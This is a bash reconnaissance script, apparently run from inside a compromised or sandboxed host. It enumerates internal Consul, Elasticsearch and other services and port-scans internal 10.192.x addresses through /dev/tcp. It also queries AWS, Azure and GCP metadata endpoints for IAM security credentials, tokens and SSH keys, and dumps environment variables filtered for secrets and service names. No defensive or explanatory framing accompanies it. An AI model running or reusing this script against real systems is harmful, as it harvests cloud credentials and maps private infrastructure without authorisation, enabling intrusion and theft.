#!/bin/bash
echo "=== V6: INTERNAL SERVICES + CONSUL + AWS ==="
date -u; hostname

echo "=== 1. CONSUL ELASTICSEARCH ==="
echo "-- DNS resolve --"
nslookup lis-es7-client.traefikelasticsearchgateway.service.nj1sbx.consul 2>&1
echo "-- direct HTTP --"
curl -sv -m 10 "http://lis-es7-client.traefikelasticsearchgateway.service.nj1sbx.consul:10150/" 2>&1 | head -c 3000; echo
echo "-- try without port --"
curl -s -m 5 "http://lis-es7-client.traefikelasticsearchgateway.service.nj1sbx.consul/" 2>&1 | head -c 1000; echo

echo "=== 2. CONSUL SERVICE DISCOVERY ==="
echo "-- consul DNS SRV --"
dig SRV lis-es7-client.traefikelasticsearchgateway.service.nj1sbx.consul 2>&1; echo
echo "-- consul agent API --"
curl -s -m 5 "http://consul.service.consul:8500/v1/catalog/services" 2>&1 | head -c 2000; echo
echo "-- consul nodes --"
curl -s -m 5 "http://consul.service.consul:8500/v1/catalog/nodes" 2>&1 | head -c 2000; echo
echo "-- resolve consul --"
nslookup consul.service.consul 2>&1
nslookup consul.service.nj1sbx.consul 2>&1

echo "=== 3. MORE CONSUL SERVICES ==="
for svc in elasticsearch redis mysql postgres kafka rabbitmq vault nomad traefik grafana prometheus; do
  echo -n "$svc.service.consul -> "
  nslookup "$svc.service.consul" 2>&1 | grep -i "address" | tail -1
  echo -n "$svc.service.nj1sbx.consul -> "
  nslookup "$svc.service.nj1sbx.consul" 2>&1 | grep -i "address" | tail -1
done

echo "=== 4. AWS METADATA ==="
echo "-- AWS IMDSv1 --"
curl -s -m 5 "http://169.254.169.254/latest/meta-data/" 2>&1 | head -c 1000; echo
echo "-- AWS IMDSv2 token --"
AWSTOK=$(curl -s -m 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>&1)
echo "aws_token: $AWSTOK"
echo "-- AWS IMDSv2 meta --"
curl -s -m 5 -H "X-aws-ec2-metadata-token: $AWSTOK" "http://169.254.169.254/latest/meta-data/" 2>&1 | head -c 1000; echo
echo "-- AWS creds --"
curl -s -m 5 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>&1 | head -c 500; echo

echo "=== 5. CLOUD METADATA VARIANTS ==="
echo "-- Azure IMDS --"
curl -s -m 5 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -c 1000; echo
echo "-- GCP recursive instance --"
MH="Metadata-Flavor: Google"
curl -s -m 5 -H "$MH" "http://169.254.169.254/computeMetadata/v1/instance/?recursive=true" 2>&1 | head -c 5000; echo
echo "-- GCP recursive project --"
curl -s -m 5 -H "$MH" "http://169.254.169.254/computeMetadata/v1/project/?recursive=true" 2>&1 | head -c 2000; echo
echo "-- GCP SSH keys --"
curl -s -m 5 -H "$MH" "http://169.254.169.254/computeMetadata/v1/project/attributes/ssh-keys" 2>&1 | head -c 2000; echo
curl -s -m 5 -H "$MH" "http://169.254.169.254/computeMetadata/v1/instance/attributes/ssh-keys" 2>&1 | head -c 2000; echo

echo "=== 6. INTERNAL NETWORK ==="
for target in "10.192.32.1:443" "10.192.32.1:8080" "10.192.32.1:6443" "10.192.32.10:53"; do
  IP=$(echo $target | cut -d: -f1)
  PORT=$(echo $target | cut -d: -f2)
  echo -n "$target -> "
  timeout 2 bash -c "echo >/dev/tcp/$IP/$PORT" 2>&1 && echo "OPEN" || echo "closed"
done

echo "=== 7. ENV (filtered) ==="
env | grep -iE 'consul|elastic|redis|kafka|vault|aws|azure|mongo|mysql|postgres|rabbit|internal|proxy|gateway|traefik' | sort

echo "=== DONE ==="
